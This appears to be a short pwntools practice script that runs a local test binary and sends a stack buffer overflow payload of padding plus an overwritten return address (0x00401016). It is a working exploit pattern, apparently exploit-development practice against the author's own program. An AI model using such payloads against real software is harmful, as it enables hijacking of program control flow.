from pwn import *

def printAndRecv():
    print(r.recvline().decode())

r = process('/media/sf_D_DRIVE/Git/test/C_C++/test.out')

printAndRecv()

r.sendline((b'a') * 0x80 + (b'a') * 8 + p64(0x00401016))
# r.interactive()
